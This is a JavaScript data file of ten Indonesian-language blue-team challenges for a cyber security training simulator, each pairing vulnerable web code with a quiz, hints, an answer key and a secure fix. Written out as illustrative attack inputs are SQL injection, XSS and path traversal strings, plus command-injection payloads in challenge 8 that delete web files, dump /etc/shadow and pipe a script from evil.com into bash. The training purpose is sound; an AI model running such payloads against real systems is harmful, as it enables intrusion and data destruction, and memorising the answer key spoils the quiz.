// ============================================================
// LKS Cyber Security Simulator — BLUE TEAM CHALLENGES
// 10 Challenges | Total Max: 1600 pts
// ============================================================

const BLUE_CHALLENGES = [

  // ─────────────────────────────────────────────
  // CHALLENGE 1 — Fix SQL Injection: Login
  // ─────────────────────────────────────────────
  {
    id: 1,
    title: "Patch SQL Injection: Login",
    category: "SQL Injection Defense",
    difficulty: "Easy",
    points: 100,
    timeBonus: 50,
    icon: "🔧",
    description: `Kode login berikut rentan terhadap SQL Injection.
Tugasmu: Identifikasi teknik perbaikan yang tepat.

[VULNERABLE CODE]
function login(username, password) {
  const query = "SELECT * FROM users WHERE username='" 
                + username + "' AND password='" + password + "'";
  return db.query(query);
}

[MASALAH]
Input user langsung di-concatenate ke query SQL tanpa validasi.
Payload ' OR '1'='1'-- bisa bypass login!

[PERTANYAAN]
Teknik keamanan apa yang harus diterapkan untuk mencegah SQL Injection?

[FORMAT JAWABAN]
submit <teknik_keamanan>

Pilihan jawaban:
A. prepared statement
B. string replace
C. input length limit
D. user validation`,

    hint: `Teknik terbaik adalah memisahkan query dari data input.
Fungsi seperti mysqli_prepare() atau PDO prepare() digunakan untuk ini.`,

    answers: [
      "prepared statement",
      "prepared statements",
      "parameterized query",
      "parameterized queries",
      "a",
      "a. prepared statement",
      "prepare",
      "pdo",
      "mysqli_prepare",
      "parameterized",
      "bind parameter",
      "binding",
    ],
    successMsg: `✅ BENAR! PATCH SQL INJECTION

[SECURE CODE]
function login(username, password) {
  const stmt = db.prepare(
    "SELECT * FROM users WHERE username = ? AND password = ?"
  );
  return stmt.execute([username, password]);
}

Kenapa Prepared Statement aman?
✅ Query dan data dipisah — input tidak bisa mengubah struktur SQL
✅ Database engine memperlakukan input sebagai DATA, bukan kode SQL
✅ Karakter seperti ' " -- tidak berbahaya karena di-escape otomatis

Referensi: OWASP SQLi Prevention Cheat Sheet 🎉`,
  },

  // ─────────────────────────────────────────────
  // CHALLENGE 2 — Fix XSS
  // ─────────────────────────────────────────────
  {
    id: 2,
    title: "Fix XSS: Output Encoding",
    category: "XSS Defense",
    difficulty: "Easy",
    points: 100,
    timeBonus: 50,
    icon: "🛡️",
    description: `Template HTML berikut menampilkan komentar pengguna tanpa encoding.

[VULNERABLE TEMPLATE - EJS/HTML]
<div class="comment">
  <%= comment.text %>
</div>

<!-- Atau dalam PHP -->
<div class="comment">
  <?php echo $comment_text; ?>
</div>

[MASALAH]
Input <script>alert(document.cookie)</script> akan dieksekusi!
Ini menyebabkan Stored XSS — semua pengunjung terkena dampak.

[PERTANYAAN]
Fungsi/metode apa yang harus digunakan untuk mencegah XSS pada output?

[FORMAT JAWABAN]
submit <metode_encoding>

Pilihan jawaban:
A. htmlspecialchars / html escape
B. base64 encode
C. md5 hash
D. string replace`,

    hint: `XSS dicegah dengan mengkonversi karakter HTML khusus menjadi entity HTML.
< menjadi &lt;  |  > menjadi &gt;  |  " menjadi &quot;`,

    answers: [
      "htmlspecialchars",
      "html escape",
      "html encoding",
      "escape html",
      "output encoding",
      "html entity",
      "html entities",
      "a",
      "a. htmlspecialchars",
      "sanitize",
      "encode",
      "escaping",
      "htmlencode",
      "encodehtml",
    ],
    successMsg: `✅ BENAR! PATCH XSS VULNERABILITY

[SECURE CODE]

// PHP
<div class="comment">
  <?php echo htmlspecialchars($comment_text, ENT_QUOTES, 'UTF-8'); ?>
</div>

// Node.js / EJS (gunakan <%- vs <%=)
<div class="comment">
  <%- escapeHtml(comment.text) %>
</div>

// JavaScript
function escapeHtml(text) {
  return text
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#39;");
}

Konversi: <script> → &lt;script&gt; (tidak dieksekusi browser) ✅ 🎉`,
  },

  // ─────────────────────────────────────────────
  // CHALLENGE 3 — Hardening Server Config
  // ─────────────────────────────────────────────
  {
    id: 3,
    title: "Hardening: Security Headers",
    category: "Server Hardening",
    difficulty: "Medium",
    points: 150,
    timeBonus: 75,
    icon: "🏰",
    description: `Konfigurasi server HTTP tidak memiliki security headers yang diperlukan.

[CURRENT SERVER RESPONSE HEADERS]
HTTP/1.1 200 OK
Content-Type: text/html
Server: Apache/2.4.41 (Ubuntu)
X-Powered-By: PHP/7.4.3
Date: Mon, 24 Nov 2024 10:00:00 GMT

[MASALAH]
❌ Tidak ada X-Frame-Options → rentan Clickjacking
❌ Tidak ada X-XSS-Protection → XSS tidak diblokir browser
❌ Tidak ada Content-Security-Policy → script injection bebas
❌ Server version terekspos → memudahkan attacker

[PERTANYAAN]
Header keamanan mana yang paling kritis untuk mencegah Clickjacking?
(Clickjacking = menyembunyikan halaman dalam iframe untuk menipu user)

[FORMAT JAWABAN]
submit <nama_security_header>`,

    hint: `Clickjacking menggunakan iframe untuk "membingkai" halaman korban.
Header yang mengontrol apakah halaman boleh di-embed dalam iframe adalah...`,

    answers: [
      "x-frame-options",
      "x-frame-options: deny",
      "x-frame-options: sameorigin",
      "x-frame-options deny",
      "x-frame-options sameorigin",
      "frame-options",
      "content-security-policy",
      "csp",
      "x-content-type-options",
      "frame-ancestors",
    ],
    successMsg: `✅ BENAR! SECURITY HEADERS CONFIGURATION

[SECURE HEADERS - Apache .htaccess]
Header always set X-Frame-Options "DENY"
Header always set X-XSS-Protection "1; mode=block"
Header always set X-Content-Type-Options "nosniff"
Header always set Referrer-Policy "strict-origin-when-cross-origin"
Header always set Content-Security-Policy "default-src 'self'; script-src 'self'"
ServerTokens Prod
ServerSignature Off

[Express.js - Helmet]
const helmet = require('helmet');
app.use(helmet());

X-Frame-Options: DENY → browser menolak load halaman dalam iframe
CSP: default-src 'self' → hanya resource dari domain sendiri yang diizinkan ✅ 🎉`,
  },

  // ─────────────────────────────────────────────
  // CHALLENGE 4 — Log Analysis
  // ─────────────────────────────────────────────
  {
    id: 4,
    title: "Log Analysis: Deteksi Intrusi",
    category: "Intrusion Detection",
    difficulty: "Hard",
    points: 200,
    timeBonus: 100,
    icon: "🔍",
    description: `Analisis log akses web berikut dan identifikasi serangan yang terjadi.

[ACCESS LOG - /var/log/apache2/access.log]
2024-11-24 09:15:01 192.168.1.100 GET /index.php 200
2024-11-24 09:15:03 192.168.1.100 GET /about.php 200
2024-11-24 09:15:45 203.0.113.42  GET /login.php 200
2024-11-24 09:15:47 203.0.113.42  POST /login.php 401
2024-11-24 09:15:48 203.0.113.42  POST /login.php 401
2024-11-24 09:15:49 203.0.113.42  POST /login.php 401
2024-11-24 09:15:50 203.0.113.42  POST /login.php 401
2024-11-24 09:15:51 203.0.113.42  POST /login.php 401
2024-11-24 09:15:52 203.0.113.42  POST /login.php 401
2024-11-24 09:15:53 203.0.113.42  POST /login.php 401
2024-11-24 09:15:54 203.0.113.42  POST /login.php 401
2024-11-24 09:15:55 203.0.113.42  POST /login.php 200 ← LOGIN!
2024-11-24 09:16:01 203.0.113.42  GET /admin/dashboard 200
2024-11-24 09:17:33 10.0.0.5     GET /search?q=test 200
2024-11-24 09:17:35 10.0.0.5     GET /search?q=' OR '1'='1 400
2024-11-24 09:17:37 10.0.0.5     GET /search?q=' UNION SELECT-- 500

[PERTANYAAN]
IP mana yang melakukan serangan BRUTE FORCE pada login?

[FORMAT JAWABAN]
submit <ip_address_penyerang_bruteforce>`,

    hint: `Brute force ditandai dengan banyak percobaan login GAGAL (401) 
dalam waktu singkat dari IP yang sama, lalu akhirnya berhasil (200).`,

    answers: [
      "203.0.113.42",
      "ip: 203.0.113.42",
    ],
    successMsg: `✅ BENAR! INTRUSION DETECTED

[ANALISIS LOG]

🔴 IP: 203.0.113.42 — BRUTE FORCE ATTACK
   • 8x POST /login.php → 401 Unauthorized (dalam 8 detik)
   • Login berhasil pada percobaan ke-9 (09:15:55)
   • Langsung akses /admin/dashboard → Penyusup berhasil masuk!

🔴 IP: 10.0.0.5 — SQL INJECTION ATTEMPT
   • GET /search?q=' OR '1'='1  → HTTP 400
   • GET /search?q=' UNION SELECT-- → HTTP 500 (error SQL!)
   • Mencoba ekstraksi data via Union SQLi

[TINDAKAN RESPONS]
✅ Block IP 203.0.113.42 di firewall segera
✅ Invalidate semua session admin aktif
✅ Block IP 10.0.0.5, patch SQL query
✅ Enable fail2ban untuk rate-limit login

Skor Investigasi: SEMPURNA! 🎉`,
  },

  // ─────────────────────────────────────────────
  // CHALLENGE 5 — Fix Broken Authentication
  // ─────────────────────────────────────────────
  {
    id: 5,
    title: "Fix Broken Authentication",
    category: "Authentication Defense",
    difficulty: "Medium",
    points: 150,
    timeBonus: 75,
    icon: "🔐",
    description: `Sistem autentikasi memiliki beberapa kelemahan kritis.

[VULNERABLE CODE]
// Session handling yang buruk
app.post('/login', (req, res) => {
  const { username, password } = req.body;
  
  // ⚠️ Password disimpan sebagai plain text!
  const user = db.findUser(username);
  if (user.password === password) {
    
    // ⚠️ Session ID yang predictable!
    req.session.id = username + '_' + Date.now();
    
    // ⚠️ Session tidak pernah expired!
    res.cookie('session', req.session.id);
    res.redirect('/dashboard');
  }
});

[MASALAH YANG ADA]
1. Password disimpan plain text (bukan hash)
2. Session ID predictable
3. Cookie tanpa flag Secure & HttpOnly
4. Session tidak pernah expired

[PERTANYAAN]
Fungsi/algoritma apa yang seharusnya digunakan untuk menyimpan password?
(Bukan enkripsi biasa — harus one-way hash yang aman)

[FORMAT JAWABAN]
submit <algoritma_hash_password>`,

    hint: `Jangan gunakan MD5 atau SHA1 untuk password — terlalu lemah!
Gunakan algoritma yang dirancang khusus untuk password hashing dengan salt.`,

    answers: [
      "bcrypt",
      "argon2",
      "argon2id",
      "scrypt",
      "pbkdf2",
      "bcrypt hash",
      "password_hash",
      "password hash",
    ],
    successMsg: `✅ BENAR! SECURE AUTHENTICATION

[SECURE CODE]
const bcrypt = require('bcrypt');
const SALT_ROUNDS = 12;

// Simpan password (saat register)
const hashedPassword = await bcrypt.hash(plainPassword, SALT_ROUNDS);
db.saveUser(username, hashedPassword);

// Verifikasi password (saat login)
const isValid = await bcrypt.compare(inputPassword, user.hashedPassword);

// Secure session
app.use(session({
  secret: crypto.randomBytes(32).toString('hex'),
  resave: false,
  saveUninitialized: false,
  cookie: {
    secure: true,      // ← HTTPS only
    httpOnly: true,    // ← Tidak bisa diakses JavaScript
    maxAge: 3600000,   // ← Expired 1 jam
    sameSite: 'strict' // ← CSRF protection
  }
}));

Bcrypt menggunakan adaptive hashing + built-in salt = aman! ✅ 🎉`,
  },

  // ─────────────────────────────────────────────
  // CHALLENGE 6 — Input Sanitization
  // ─────────────────────────────────────────────
  {
    id: 6,
    title: "Input Sanitization & Validation",
    category: "Input Validation",
    difficulty: "Easy",
    points: 100,
    timeBonus: 50,
    icon: "🧹",
    description: `Formulir registrasi menerima semua input tanpa validasi apapun.

[VULNERABLE CODE]
app.post('/register', (req, res) => {
  const { username, email, age } = req.body;
  
  // ⚠️ Tidak ada validasi!
  db.createUser({ username, email, age });
  res.json({ success: true });
});

[SERANGAN YANG MUNGKIN]
❌ username: "<script>alert(1)</script>" → XSS
❌ email: "bukan_email" → Data kotor
❌ age: "-999" atau "999999" → Data tidak valid
❌ username: "' OR 1=1--" → SQLi (selain prepared statement)

[PERTANYAAN]
Pendekatan validasi mana yang PALING AMAN untuk memvalidasi input?
(Memastikan hanya karakter/format yang diizinkan yang diterima)

[FORMAT JAWABAN]
submit <pendekatan_validasi>

Pilihan:
A. whitelist validation (hanya izinkan yang diketahui aman)
B. blacklist validation (blokir karakter berbahaya yang diketahui)
C. length check only
D. trim whitespace`,

    hint: `Blacklist validation selalu bisa di-bypass dengan encoding baru.
Whitelist memastikan HANYA format yang kamu tentukan yang diterima.`,

    answers: [
      "whitelist",
      "whitelist validation",
      "allowlist",
      "allowlist validation",
      "a",
      "a. whitelist validation",
      "positive validation",
      "allow list",
    ],
    successMsg: `✅ BENAR! SECURE INPUT VALIDATION

[SECURE CODE - Whitelist Validation]
const validator = require('validator');

app.post('/register', (req, res) => {
  const { username, email, age } = req.body;
  
  // Whitelist: hanya izinkan yang kamu definisikan
  if (!validator.isAlphanumeric(username) || username.length > 30) {
    return res.status(400).json({ error: 'Username tidak valid' });
  }
  if (!validator.isEmail(email)) {
    return res.status(400).json({ error: 'Email tidak valid' });
  }
  if (!validator.isInt(age, { min: 1, max: 120 })) {
    return res.status(400).json({ error: 'Umur tidak valid' });
  }
  
  // Setelah validasi lolos, baru proses
  db.createUser({ username, email, age: parseInt(age) });
  res.json({ success: true });
});

Whitelist > Blacklist karena attacker selalu bisa bypass blacklist! ✅ 🎉`,
  },

  // ─────────────────────────────────────────────
  // CHALLENGE 7 — Code Review
  // ─────────────────────────────────────────────
  {
    id: 7,
    title: "Code Review: Temukan Kerentanan",
    category: "Code Review",
    difficulty: "Hard",
    points: 200,
    timeBonus: 100,
    icon: "👁️",
    description: `Review kode berikut dan temukan semua kerentanan keamanan!

[CODE TO REVIEW]
// File: api.js
const express = require('express');
const { exec } = require('child_process');
const fs = require('fs');

app.get('/report', (req, res) => {
  const filename = req.query.file;
  // [1] Read file
  const content = fs.readFileSync('/reports/' + filename);
  res.send(content);
});

app.post('/notify', (req, res) => {
  const email = req.body.email;
  // [2] Send email notification
  exec('sendmail ' + email, (err, out) => {
    res.json({ sent: true });
  });
});

app.get('/user', (req, res) => {
  const id = req.query.id;
  // [3] Get user data
  const q = "SELECT * FROM users WHERE id=" + id;
  db.query(q, (err, result) => {
    res.json(result); // [4] Returns all columns!
  });
});

[PERTANYAAN]
Ada berapa TOTAL kerentanan dalam kode di atas?
(Hitung semua yang bisa dieksploitasi — minimal 4)

[FORMAT JAWABAN]
submit <jumlah_kerentanan>`,

    hint: `Periksa setiap operasi:
[1] Operasi file dengan input user → ?
[2] Fungsi exec() dengan input user → ?
[3] Query SQL dengan input user → ?
[4] Return data tanpa filter → ?`,

    answers: [
      "4",
      "empat",
      "four",
      "4 kerentanan",
      "minimal 4",
      "5",
      "lima",
    ],
    successMsg: `✅ BENAR! CODE REVIEW ANALYSIS

[KERENTANAN DITEMUKAN]

1️⃣ PATH TRAVERSAL — [1] /report endpoint
   fs.readFileSync('/reports/' + filename)
   → Input ../../../etc/passwd membaca file sensitif!
   Fix: path.basename(filename) + validate extension

2️⃣ COMMAND INJECTION — [2] /notify endpoint
   exec('sendmail ' + email)
   → Input "x; cat /etc/passwd" menjalankan command!
   Fix: Use nodemailer library, never exec with user input

3️⃣ SQL INJECTION — [3] /user endpoint
   "SELECT * FROM users WHERE id=" + id
   → Input "1 OR 1=1" dump semua user!
   Fix: Parameterized query / prepared statement

4️⃣ EXCESSIVE DATA EXPOSURE — [4] /user endpoint
   res.json(result) — return semua kolom termasuk password!
   → Attacker dapat password hash, token, data sensitif
   Fix: SELECT hanya kolom yang diperlukan, filter sebelum return

Total: 4 kerentanan kritis ditemukan! 🎉`,
  },

  // ─────────────────────────────────────────────
  // CHALLENGE 8 — Fix Command Injection
  // ─────────────────────────────────────────────
  {
    id: 8,
    title: "Fix Command Injection",
    category: "Command Injection Defense",
    difficulty: "Medium",
    points: 150,
    timeBonus: 75,
    icon: "⚙️",
    description: `Aplikasi ping tool rentan terhadap command injection.

[VULNERABLE CODE - Node.js]
app.get('/ping', (req, res) => {
  const host = req.query.host;
  
  // ⚠️ LANGSUNG exec dengan user input!
  exec('ping -c 4 ' + host, (err, stdout) => {
    res.send('<pre>' + stdout + '</pre>');
  });
});

[SERANGAN]
?host=127.0.0.1; rm -rf /var/www/html/*
?host=127.0.0.1 && curl http://evil.com/shell.sh | bash
?host=127.0.0.1; cat /etc/shadow > /var/www/html/leaked.txt

[PERTANYAAN]
Metode terbaik untuk mencegah command injection pada kasus ini adalah?

[FORMAT JAWABAN]
submit <metode_pencegahan>

Pilihan:
A. escapeshellarg / escape shell argument
B. remove semicolon from input
C. use blacklist of special chars
D. convert to uppercase`,

    hint: `Fungsi escape khusus shell tersedia di PHP dan library Node.js.
Atau lebih baik: gunakan library yang tidak butuh shell sama sekali.`,

    answers: [
      "escapeshellarg",
      "a",
      "a. escapeshellarg",
      "escape shell argument",
      "shell escape",
      "shelljs",
      "use library",
      "avoid exec",
      "whitelist ip",
      "ip validation",
      "validate ip",
      "regex validation",
      "net-ping",
    ],
    successMsg: `✅ BENAR! COMMAND INJECTION FIX

[SECURE CODE - Option 1: Input Validation]
const net = require('net');

app.get('/ping', (req, res) => {
  const host = req.query.host;
  
  // Whitelist: hanya izinkan format IP valid atau hostname sederhana
  if (!net.isIP(host) && !/^[a-zA-Z0-9.-]+$/.test(host)) {
    return res.status(400).json({ error: 'Host tidak valid' });
  }
  
  // Gunakan array args (tidak melalui shell!)
  const { execFile } = require('child_process');
  execFile('ping', ['-c', '4', host], (err, stdout) => {
    res.send('<pre>' + escapeHtml(stdout) + '</pre>');
  });
});

[SECURE CODE - Option 2: Library]
const ping = require('net-ping');
// Gunakan library yang tidak butuh shell sama sekali!

execFile() dengan array args TIDAK melalui shell → aman! ✅ 🎉`,
  },

  // ─────────────────────────────────────────────
  // CHALLENGE 9 — Fix Path Traversal
  // ─────────────────────────────────────────────
  {
    id: 9,
    title: "Fix Path Traversal",
    category: "Path Traversal Defense",
    difficulty: "Medium",
    points: 150,
    timeBonus: 75,
    icon: "📂",
    description: `Endpoint download file rentan terhadap path traversal.

[VULNERABLE CODE]
const BASE_DIR = '/var/www/uploads/';

app.get('/download', (req, res) => {
  const filename = req.query.file;
  
  // ⚠️ Langsung join tanpa validasi!
  const filepath = BASE_DIR + filename;
  res.sendFile(filepath);
});

[SERANGAN]
?file=../../../etc/passwd
?file=../../etc/shadow
?file=../../../../var/log/auth.log

[PERTANYAAN]
Fungsi Node.js apa yang digunakan untuk mengambil hanya nama file
(tanpa directory path) dari sebuah path string?

[FORMAT JAWABAN]
submit <nama_fungsi>

Contoh: submit namaFungsi`,

    hint: `Modul 'path' di Node.js memiliki fungsi untuk mengekstrak 
hanya bagian nama file (tanpa directory) dari path string.
path.______('../../etc/passwd') → 'passwd'`,

    answers: [
      "path.basename",
      "basename",
      "path basename",
      "path.resolve",
      "resolve",
    ],
    successMsg: `✅ BENAR! PATH TRAVERSAL FIX

[SECURE CODE]
const path = require('path');
const BASE_DIR = path.resolve('/var/www/uploads/');

app.get('/download', (req, res) => {
  const filename = req.query.file;
  
  // ✅ Ambil hanya nama file (hapus directory component)
  const safeFilename = path.basename(filename);
  
  // ✅ Resolve path absolut
  const filepath = path.resolve(BASE_DIR, safeFilename);
  
  // ✅ Pastikan path masih dalam BASE_DIR
  if (!filepath.startsWith(BASE_DIR)) {
    return res.status(403).json({ error: 'Akses ditolak' });
  }
  
  // ✅ Cek file ada
  if (!fs.existsSync(filepath)) {
    return res.status(404).json({ error: 'File tidak ditemukan' });
  }
  
  res.sendFile(filepath);
});

path.basename('../../../etc/passwd') → 'passwd' (aman!) ✅ 🎉`,
  },

  // ─────────────────────────────────────────────
  // CHALLENGE 10 — Fix IDOR
  // ─────────────────────────────────────────────
  {
    id: 10,
    title: "Fix IDOR: Authorization Check",
    category: "IDOR Defense",
    difficulty: "Hard",
    points: 200,
    timeBonus: 100,
    icon: "🔒",
    description: `API profil pengguna rentan terhadap IDOR (Insecure Direct Object Reference).

[VULNERABLE CODE]
app.get('/api/profile', authenticate, (req, res) => {
  const userId = req.query.id; // ← ID dari URL parameter
  
  // ⚠️ Tidak ada cek apakah user boleh akses ID ini!
  db.query('SELECT * FROM users WHERE id = ?', [userId], (err, result) => {
    res.json(result[0]);
  });
});

// middleware authenticate hanya cek apakah user LOGIN
// tapi tidak cek apakah user BERHAK akses resource tersebut

[MASALAH]
User dengan ID 42 bisa akses profil user ID 1 (admin)
hanya dengan mengubah parameter: ?id=1

[PERTANYAAN]
Konsep keamanan apa yang harus ditambahkan setelah autentikasi
untuk memastikan user hanya bisa akses data miliknya sendiri?

[FORMAT JAWABAN]
submit <konsep_keamanan>

Pilihan:
A. authorization / access control
B. authentication
C. encryption
D. logging`,

    hint: `Autentikasi = memverifikasi siapa kamu (login)
__________ = memverifikasi apa yang boleh kamu lakukan (hak akses)`,

    answers: [
      "authorization",
      "access control",
      "authorization / access control",
      "a",
      "a. authorization",
      "a. authorization / access control",
      "object level authorization",
      "bola",
      "broken object level authorization",
      "rbac",
      "role based access control",
    ],
    successMsg: `✅ BENAR! IDOR FIX — AUTHORIZATION

[SECURE CODE]
app.get('/api/profile', authenticate, (req, res) => {
  const requestedId = parseInt(req.query.id);
  const currentUserId = req.user.id; // dari JWT/session setelah autentikasi
  const currentUserRole = req.user.role;
  
  // ✅ AUTHORIZATION CHECK
  // User biasa hanya bisa akses profil sendiri
  // Admin bisa akses semua profil
  if (requestedId !== currentUserId && currentUserRole !== 'admin') {
    return res.status(403).json({ 
      error: 'Forbidden: Kamu tidak memiliki akses ke resource ini' 
    });
  }
  
  db.query(
    'SELECT id, username, email, created_at FROM users WHERE id = ?',
    [requestedId],
    (err, result) => {
      if (!result.length) return res.status(404).json({ error: 'Not found' });
      res.json(result[0]); // ← hanya kolom yang aman
    }
  );
});

Authentication ≠ Authorization
Auth hanya cek siapa kamu, bukan apa hakmu! ✅ 🎉`,
  },

];

// Export for use in game.js
if (typeof module !== 'undefined') module.exports = BLUE_CHALLENGES;

